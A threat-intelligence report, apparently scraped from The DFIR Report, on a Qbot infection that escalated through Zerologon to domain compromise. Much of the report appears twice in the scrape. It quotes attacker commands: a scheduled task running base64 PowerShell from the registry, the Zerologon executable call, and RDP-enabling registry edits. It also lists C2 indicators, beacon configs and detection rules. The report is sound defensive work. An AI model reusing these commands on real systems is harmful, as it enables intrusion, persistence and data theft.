HKLM\\System\\CurrentControlSet\\Services\\af5ff02\\ImagePath HKLM\\System\\CurrentControlSet\\Services\\c46234f\\ImagePath Cobalt Strike first calls OpenSCManagerW to create the service remotely, then starts it with StartServiceA function: RDP/interactive Logins Various commands were executed to enable the RDP service on various hosts: Increase the max RDP connections allowed, in this case a arbitrarily large number. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"MaxInstanceCount\" /d 0xffffffff /f Makes sure the RDP listener is enabled. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"fEnableWinStation\" /d 1 /f Makes sure the user is allowed to RDP to the terminal server. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSUserEnabled\" /d 0 /f Makes sure the terminal server is set to enabled. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSEnabled\" /d 1 /f Makes sure terminal services is set to remote admin mode. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAppCompat\" /d 0 /f Makes sure that the terminal service will start idle sessions. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"IdleWinStationPoolCount\" /d 1 /f Enables advertisement of the terminal server. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAdvertise\" /d 1 /f Makes sure terminal server is set to allow connections. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"AllowTSConnections\" /d 1 /f Makes sure terminal server is set to simultaneous sessions. REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /t REG_DWORD /v \"EnableConcurrentSessions\" /d 1 /f Makes sure multiple sessions are allowed. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"fSingleSessionPerUser\" /d 0 /f Starts the terminal services and sets service to autostart. sc config termservice start= auto net start termservice /y The threat actor then established interactive administrative RDP sessions and pivoted to different hosts in the network. LogName=Security EventCode=4624 Logon Type=10 (Remote Interactive Logon - RDP) Named pipe (SMB) The base64 encoded payload can be decoded using this Cyberchef recipe (shout out @0xtornado ) which represents a SMB beacon that creates the named pipe \u201cdce_3d\u201d. LogName=Microsoft-Windows-System/Operational EventCode=17 TaskCategory=Pipe Created (rule: PipeEvent) Command and Control QBot details \u2013 24.229.150.54 // 41.228.22.180 24.229.150[.]54:995 / avlhestito[.]us Certificate: 25:a6:ef:79:48:98:54:ee:bb:a6:bd:10:ee:c1:f2:0a:00:ad:ac:ce Not Before 2021/11/15 09:24:49 UTC Not After 2022/11/15 13:18:32 UTC Issuer Org Rsc Inpye LLC. Subject Common avlhestito[.]us Public Algorithm rsaEncryption JA3: c35a61411ee5bdf666b4d64b05c29e64 JA3s: 7c02dbae662670040c7af9bd15fb7e2f 41.228.22[.]180:443 / xrhm[.]info Certificate: 96:39:a9:52:e9:9a:1e:29:c5:dc:b3:72:01:29:74:c4:87:db:15:d7 Not Before: 2021/11/12 04:34:10 UTC Not After: 2022/11/12 10:08:57 UTC Issuer Org: Bqatra Bamito Inc. Subject Common: xrhm[.]info Public Algorithm: rsaEncryption JA3: c35a61411ee5bdf666b4d64b05c29e64 JA3s: 7c02dbae662670040c7af9bd15fb7e2f Here is the initial access DLL (Qbot) information from Tria.ge Cobalt Strike details \u2013 5.255.98[.]144 This Cobalt Strike server was added to our Threat Feed on 2021-11-16. 5.255.98.144:8888 / 5.255.98.144:443 / 5.255.98.144:8080 / dxabt[.]com Certificate: [25:fe:be:6d:0e:8d:48:5a:94:cf:46:84:d7:7e:ff:bf:47:aa:04:5c ] Not Before: 2021/11/07 03:00:53 UTC Not After: 2022/02/05 03:00:52 UTC Issuer Org: Let's Encrypt Subject Common: dxabt[.]com [dxabt[.]com,ns1.dxabt[.]com,ns2.dxabt[.]com,ns3.dxabt[.]com,ns4.dxabt[.]com Public Algorithm: rsaEncryption JA3: 0eecb7b1551fba4ec03851810d31743f JA3s: ae4edc6faf64d08308082ad26be60767 Config: { \"x64\": { \"uri_queried\": \"/tRPG\", \"sha256\": \"dec25fc2fe7e76fe191fbfdf48588c4325f52bfe2769fbc88a5614541c1075eb\", \"config\": { \"HTTP Method Path 2\": \"/faq\", \"Jitter\": 79, \"C2 Server\": \"dxabt[.]com,/case\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\", \"Method 1\": \"GET\", \"C2 Host Header\": \"\", \"Method 2\": \"POST\", \"Watermark\": 426352781, \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\", \"Beacon Type\": \"8 (HTTPS)\", \"Port\": 443, \"Polling\": 53988 }, \"time\": 1637416040175.3, \"md5\": \"30cc71d5b5d7778774c54486558690d3\", \"sha1\": \"5f36c6cffdbae0d631c8889b4d9bad1248f899b3\" }, \"x86\": { \"uri_queried\": \"/Mr0m\", \"sha256\": \"a992d57b2f6164e599952ea3c245962824ad17166684ed45e987efe80ebe611f\", \"config\": { \"HTTP Method Path 2\": \"/faq\", \"Jitter\": 79, \"C2 Server\": \"dxabt[.]com,/case\", \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\", \"Method 1\": \"GET\", \"C2 Host Header\": \"\", \"Method 2\": \"POST\", \"Watermark\": 426352781, \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\", \"Beacon Type\": \"8 (HTTPS)\", \"Port\": 443, \"Polling\": 53988 }, \"time\": 1637416038974.9, \"md5\": \"c1fd49c043894c1dff8bc02b17f8942c\", \"sha1\": \"e915f74be310b1687db6b290af2f78583a981512\" } } Exfiltration While the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165. These alerts tell us that data was indeed exfiltrated from the environment. The threat actors were most interested in files concerning financial statements, ransomware reports, and salary data. The C2 channel was encrypted and multiple connections were established with the internal file server. No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration. At 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server. According to the number of connections to the C2 from the File Server per minute, we can conclude that exfiltration was done between 17:52 UTC and 18:00 UTC. Spike in traffic from file share server to Cobalt Strike command and control server. IOCs Network QBOT 24.229.150[.]54:995 - avlhestito[.]us 41.228.22[.]180:443 - xrhm[.]info Cobalt Strike 5.255.98[.]144:8888 / dxabt[.]com 5.255.98[.]144:443 / dxabt[.]com 5.255.98[.]144:8080 / dxabt[.]com File Intial Exec Qbot DLL MD5:53510e20efb161d5b71c4ce2800c1a8d SHA1:2268178851d0d0debb9ab457d73af8a5e50af168 SHA2:e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987 QBot DLL (extracted from registry): MD5:312e52b4109741893f17bc524084100f SHA1:7ca650945223eab088f43fd472e3592be2ed9d32 SHA2:4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b cool.exe MD5:59E7F22D2C290336826700F05531BD30 SHA1:3B2A0D2CB8993764A042E8E6A89CBBF8A29D47D1 SHA256:F63E17FF2D3CFE75CF3BB9CF644A2A00E50AAFFE45C1ADF2DE02D5BD0AE35B0 Detections Network ET POLICY Powershell Activity Over SMB - Likely Lateral Movement ET POLICY Command Shell Activity Using Comspec Environmental Variable Over SMB - Very Likely Lateral Movement ET RPC DCERPC SVCCTL - Remote Service Control Manager Access ET CNC Feodo Tracker Reported CnC Server group 15 ET CNC Feodo Tracker Reported CnC Server group 16 The following rules may cause performance issues (and are disabled by default) according to @ET_Labs ET EXPLOIT Possible Zerologon NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) - 2030870 ET EXPLOIT Possible Zerologon NetrServerAuthenticate with 0x00 Client Credentials (CVE-2020-1472) 2030871 ET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) UUID flowbit set - 2030888 ET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) M2 - 2030889 New signatures thanks to @ET_Labs ! 2035258 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1 2035259 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2 2035260 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1 2035261 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2 2035262 - ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472) 2035263 - ET EXPLOIT Zerologon Phase 3/3 - NetrLogonSamLogonWithFlags Request with 0x00 Client Credentials (CVE-2020-1472) Sigma title: Scheduled task executing powershell encoded payload from registry status: Experimental description: Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell. author: @Kostastsale , @TheDFIRReport references: - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/ date: 2022/02/12 logsource: product: windows category: process_creation detection: selection1: Image|endswith: '\\schtasks.exe' CommandLine|contains|all: - '/Create' - '/SC' selection2: CommandLine|contains|all: - 'FromBase64String' - 'powershell' - 'Get-ItemProperty' - 'HKCU:' condition: selection1 and selection2 falsepositives: - Uknown level: high tags: - attack.execution - attack.persistence - attack.t1053.005 - attack.t1059.001 title: Execution of ZeroLogon PoC executable status: Experimental description: Detects the execution of the commonly used ZeroLogon PoC executable. author: @Kostastsale, @TheDFIRReport references: - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/ - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/ date: 2022/02/12 logsource: product: windows category: process_creation detection: selection1: ParentImage|endswith: - '\\cmd.exe' Image|endswith: - '\\cool.exe' - '\\zero.exe' CommandLine|contains|all: - 'Administrator' - '-c' selection2: CommandLine|contains|all: - 'taskkill' - '/f' - '/im' selection3: CommandLine|contains: - 'powershell' condition: selection1 and (selection2 or selection3) falsepositives: - Uknown level: high tags: - attack.execution - attack.lateral_movement - attack.T1210 title: Enabling RDP service via reg.exe command execution status: Experimental description: Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host author: @Kostastsale , @TheDFIRReport references: - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/ date: 2022/02/12 logsource: product: windows category: process_creation detection: selection1: Image|endswith: - '\\reg.exe' CommandLine|contains|all: - 'add' - 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' - 'REG_DWORD' Winstations1: CommandLine|contains: - 'WinStations\\RDP-Tcp' Winstations2: CommandLine|contains: - 'MaxInstanceCount' - 'fEnableWinStation' selection2: CommandLine|contains|all: - 'Licensing Core' - 'EnableConcurrentSessions' selection3: CommandLine|contains: - 'TSUserEnabled' - 'TSEnabled' - 'TSAppCompat' - 'IdleWinStationPoolCount' - 'TSAdvertise' - 'AllowTSConnections' - 'fSingleSessionPerUser' condition: selection1 and ((Winstations1 and Winstations2) or (selection2 or selection3)) falsepositives: - Uknown level: high tags: - attack.defense_evasion - attack.lateral_movement - attack.t1021.001 - attack.t1112 https://github.com/SigmaHQ/sigma/blob/a502f316efdcc8c174b7cf412029dfae5b3552c8/rules/windows/builtin/security/win_pass_the_hash_2.yml https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_powershell_as_service.yml https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml https://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_nltest_recon.yml https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_susp_whoami.yml Yara /* YARA Rule Set Author: The DFIR Report Date: 2022-02-20 Identifier: Case 8734 Reference: https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/ */ /* Rule Set ----------------------------------------------------------------- */ import \"pe\" rule qbot_8734_payload_dll { meta: description = \"files - file e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\" author = \"The DFIR Report\" reference = \"https://thedfirreport.com\" date = \"2022-02-20\" hash1 = \"e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\" strings: $s1 = \"Terfrtghygine.dll\" fullword ascii $s2 = \"Winamp can read extended metadata for titles. Choose when this happens:\" fullword wide /* Goodware String - occured 1 times */ $s3 = \"Read metadata when file(s) are loaded into Winamp\" fullword wide /* Goodware String - occured 1 times */ $s4 = \"Use advanced title formatting when possible\" fullword wide /* Goodware String - occured 1 times */ $s5 = \"PQVW=!?\" fullword ascii $s6 = \"Show underscores in titles as spaces\" fullword wide /* Goodware String - occured 1 times */ $s7 = \"Advanced title display format :\" fullword wide /* Goodware String - occured 1 times */ $s8 = \"CreatePaint\" fullword ascii $s9 = \"PQRVW=2\\\"\" fullword ascii $s10 = \"Advanced Title Formatting\" fullword wide /* Goodware String - occured 1 times */ $s11 = \"Read metadata when file(s) are played or viewed in the playlist editor\" fullword wide /* Goodware String - occured 1 times */ $s12 = \"Show '%20's in titles as spaces\" fullword wide /* Goodware String - occured 1 times */ $s13 = \"Example : \\\"%artist% - %title%\\\"\" fullword wide /* Goodware String - occured 1 times */ $s14 = \"PQRVW=g\" fullword ascii $s15 = \"PQRW=e!\" fullword ascii $s16 = \"ATF Help\" fullword wide /* Goodware String - occured 1 times */ $s17 = \"(this can be slow if a large number of files are added at once)\" fullword wide /* Goodware String - occured 1 times */ $s18 = \"PQRVW=$\" fullword ascii $s19 = \"Metadata Reading\" fullword wide /* Goodware String - occured 1 times */ $s20 = \"Other field names: %artist%, %album%, %title%, %track%, %year%, %genre%, %comment%, %filename%, %disc%, %rating%, ...\" fullword wide /* Goodware String - occured 1 times */ condition: uint16(0) == 0x5a4d and filesize < 2000KB and ( pe.imphash() == \"aa8a9db10fba890f8ef9edac427eab82\" and pe.exports(\"CreatePaint\") or 8 of them ) } rule qbot_dll_8734 { meta: description = \"files - qbot.dll\" author = \"TheDFIRReport\" reference = \"QBOT_DLL\" date = \"2021-12-04\" hash1 = \"4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\" strings: $s1 = \"Execute not supported: %sfField '%s' is not the correct type of calculated field to be used in an aggregate, use an internalcalc\" wide $s2 = \"IDAPI32.DLL\" fullword ascii $s3 = \"ResetUsageDataActnExecute\" fullword ascii $s4 = \"idapi32.DLL\" fullword ascii $s5 = \"ShowHintsActnExecute\" fullword ascii $s6 = \"OnExecute@iG\" fullword ascii $s7 = \"OnExecutexnD\" fullword ascii $s8 = \"ShowShortCutsInTipsActnExecute\" fullword ascii $s9 = \"ResetActnExecute \" fullword ascii $s10 = \"RecentlyUsedActnExecute\" fullword ascii $s11 = \"LargeIconsActnExecute\" fullword ascii $s12 = \"ResetActnExecute\" fullword ascii $s13 = \"OnExecute<\" fullword ascii $s14 = \"TLOGINDIALOG\" fullword wide $s15 = \"%s%s:\\\"%s\\\";\" fullword ascii $s16 = \":\\\":&:7:?:C:\\\\:\" fullword ascii /* hex encoded string '|' */ $s17 = \"LoginPrompt\" fullword ascii $s18 = \"TLoginDialog\" fullword ascii $s19 = \"OnLogin\" fullword ascii $s20 = \"Database Login\" fullword ascii condition: uint16(0) == 0x5a4d and filesize < 3000KB and 8 of the MITRE Exploitation for Privilege Escalation \u2013 T1068 Service Execution \u2013 T1569.002 Network Share Discovery \u2013 T1135 Pass the Hash \u2013 T1550.002 PowerShell \u2013 T1059.001 Windows Command Shell \u2013 T1059.003 Network Share Discovery \u2013 T1135 Obfuscated Files or Information \u2013 T1027 Scheduled Task \u2013 T1053.005 Process Injection \u2013 T1055 Remote System Discovery \u2013 T1018 Obfuscated Files or Information \u2013 T1027 Domain Trust Discovery \u2013 T1482 Domain Groups \u2013 T1069.002 System Owner/User Discovery \u2013 T1033 Network Share Discovery \u2013 T1135 Remote Services \u2013 T1021 Local Account \u2013 T1087.001 Security Software Discovery \u2013 T1518.001 Internal case 8734 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Qbot Likes to Move It, Move It 2021 Year In Review Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "Qbot and Zerologon Lead To Full Domain Compromise \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind cobaltstrike Qbot Qbot and Zerologon Lead To Full Domain Compromise February 21, 2022 In this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware. Soon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat actor then exfiltrated sensitive documents from the environment before being evicted from the network. Summary The threat actors gained initial access to a Windows workstation through the execution of a malicious DLL. The first activity of QBot was seen 5 minutes after the DLL was executed. Various automated discovery commands were used to map the network topology, retrieve local group member information, and list available file shares/privileges of the infected user. Following the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence. The scheduled task\u2019s primary purpose was to execute a (base64-encoded) PowerShell Cobalt Strike beacon every 30 minutes. Once the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as N ltest, net and ADFind. Upon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability. The executable used bears striking similarity to the one used in a previous case From Zero to Domain Admin based on command line arguments and the overall execution of the exploit. The executable named cool.exe resets the domain controller password to an empty string, retrieves the Domain Admin password Hash, and installs a service on the DC to reset the DC password so as to not break Active Directory operations. The domain admin hash was then used on the beachhead through an over-pass-the-hash attack . After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers. Finally, documents were stolen and exfiltrated through Cobalt Strike encrypted C2 channel (HTTPS) . To conclude this case, the threat actors were evicted from the network before they completed any further objectives. Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as QBot, Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here . We also have artifacts and IOCs available from this case such as memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. Timeline Analysis and reporting completed by @pigerlin & @MetallicHack Reviewed by @ICSNick & @kostastsale Initial Access The threat actor gained their initial access through the execution of a malicious DLL. Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL. In this case, however, the execution started directly from the qbot DLL found here . The execution chain for this QBot infection can be seen below: Execution QBot PowerShell analysis We analyzed the registry path and associated keys that were queried by the scheduled task HKCU:\\SOFTWARE\\Pvoeooxf and discovered that three keys were created containing base64 encoded values. Decoding the values resulted in: 1. Copy of QBot DLL 2. String of QBot C2 IP-addresses separated by a semicolon. 3. Obfuscated PowerShell script that is referenced by the scheduled task. The PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below: When run for the first time, the script creates a new registry key entry in the same path, saving the date of execution. It then verifies upon execution if the creation date key of this registry key is older than 4 hours. Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it. OR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the Invoke-WebRequest PowerShell module: The PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files. The encoded QBot DLL that was stored in the registry, was dropped in the directory %APPDATA%\\Roaming\\Microsoft\\Fdopitcu . The unsigned DLL, with descriptor Cancel Autoplay 2 was executed using regsvr32.exe Upon execution of this second-stage DLL, various registry keys were created in HKCU\\Software\\Microsoft\\Yerqbqokc. In addition, a new instance of explorer.exe (32-bit) was started and injected into. The registry keys contain eight-character long hex strings for which we believe is part of the malware\u2019s encrypted config . Persistence Scheduled Task/Job \u2013 Scheduled Task On Beachhead The scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry. schtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30 LogName: Microsoft-Windows-TaskScheduler/Operational EventCode: 106 Message: Task scheduler Task Registered Privilege Escalation Thirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon. The executable was named \u201ccool.exe\u201d : C:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\" Three milliseconds after the Zerologon exploit , an event 4742 \u201cA computer account was changed.\u201d was generated on the targeted Domain Controller. As explained in a detailed blog from CrowdStrike , the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV : \u201cIn order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key. However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes. This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256. Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren\u2019t rejected by servers (by default). The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.\u201d As we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller : After the end of the brute force traffic, we can see a single instance where a the exploit has completed successfully. After being successfully authenticated, the DC password was set: The PasswordLastSet field is equal to the TimeCreated field, meaning that the password of the domain controller was successfully updated. We can also see that the SubjectUserName is ANONYMOUS LOGON. A connection was performed from the beachhead to the Domain Controller using the DC account. After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain. The explorer shell was also restarted by the threat actor: Defense Evasion Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process. The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication. Over-Pass-the-Hash from Beachhead The threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash to request a TGT from the domain controller. We have seen the use of over-pass-the-hash several times before. For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail. Soon after, a TGT for the administrator account was requested: Discovery QBot initially starts a number of processes to collect information about the affected system. This is part of the \u201cSYSTEM INFO\u201d bot request, as described in a recent article from SecureList . Later, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment. ADFind (renamed in find.exe) used to enumerate computers C:\\redacted\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName On the Domain Controller, the threat actors gathered information about the installed security software through WMI: C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value Ping was used to verify machines were online ping -n 1 [REDACTED] Lateral Movement Through the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment. EventCode: 7045 Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <redacted> User: NT AUTHORITY\\SYSTEM ParentImage: C:\\Windows\\System32\\services.exe ParentCommandLine: C:\\Windows\\system32\\services.exe On the first Domain Controller, a Cobalt Strike service was installed: Log Source: Microsoft-Windows-Service Control Manager Event ID:7045 Multiple services were installed by Cobalt Strike across the environment, here are a few examples: HKLM\\System\\CurrentControlSet\\Services\\3141131\\ImagePath HKLM\\System\\CurrentControlSet\\Services\\af5ff02\\ImagePath HKLM\\System\\CurrentControlSet\\Services\\c46234f\\ImagePath Cobalt Strike first calls OpenSCManagerW to create the service remotely, then starts it with StartServiceA function: RDP/interactive Logins Various commands were executed to enable the RDP service on various hosts: Increase the max RDP connections allowed, in this case a arbitrarily large number. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"MaxInstanceCount\" /d 0xffffffff /f Makes sure the RDP listener is enabled. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"fEnableWinStation\" /d 1 /f Makes sure the user is allowed to RDP to the terminal server. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSUserEnabled\" /d 0 /f Makes sure the terminal server is set to enabled. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSEnabled\" /d 1 /f Makes sure terminal services is set to remote admin mode. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAppCompat\" /d 0 /f Makes sure that the terminal service will start idle sessions. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"IdleWinStationPoolCount\" /d 1 /f Enables advertisement of the terminal server. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAdvertise\" /d 1 /f Makes sure terminal server is set to allow connections. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"AllowTSConnections\" /d 1 /f Makes sure terminal server is set to simultaneous sessions. REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /t REG_DWORD /v \"EnableConcurrentSessions\" /d 1 /f Makes sure multiple sessions are allowed. REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"fSingleSessionPerUser\" /d 0 /f Starts the terminal services and sets service to autostart. sc config termservice start= auto net start termservice /y The threat actor then established interactive administrative RDP sessions and pivoted to different hosts in the network. LogName=Security EventCode=4624 Logon Type=10 (Remote Interactive Logon - RDP) Named pipe (SMB) The base64 encoded payload can be decoded using this Cyberchef recipe (shout out @0xtornado ) which represents a SMB beacon that creates the named pipe \u201cdce_3d\u201d. LogName=Microsoft-Windows-System/Operational EventCode=17 TaskCategory=Pipe Created (rule: PipeEvent) Command and Control QBot details \u2013 24.229.150.54 // 41.228.22.180 24.229.150[.]54:995 / avlhestito[.]us Certificate: 25:a6:ef:79:48:98:54:ee:bb:a6:bd:10:ee:c1:f2:0a:00:ad:ac:ce Not Before 2021/11/15 09:24:49 UTC Not After 2022/11/15 13:18:32 UTC Issuer Org Rsc Inpye LLC. Subject Common avlhestito[.]us Public Algorithm rsaEncryption JA3: c35a61411ee5bdf666b4d64b05c29e64 JA3s: 7c02dbae662670040c7af9bd15fb7e2f 41.228.22[.]180:443 / xrhm[.]info Certificate: 96:39:a9:52:e9:9a:1e:29:c5:dc:b3:72:01:29:74:c4:87:db:15:d7 Not Before: 2021/11/12 04:34:10 UTC Not After: 2022/11/12 10:08:57 UTC Issuer Org: Bqatra Bamito Inc. Subject Common: xrhm[.]info Public Algorithm: rsaEncryption JA3: c35a61411ee5bdf666b4d64b05c29e64 JA3s: 7c02dbae662670040c7af9bd15fb7e2f Here is the initial access DLL (Qbot) information from Tria.ge Cobalt Strike details \u2013 5.255.98[.]144 This Cobalt Strike server was added to our Threat Feed on 2021-11-16. 5.255.98.144:8888 / 5.255.98.144:443 / 5.255.98.144:8080 / dxabt[.]com Certificate: 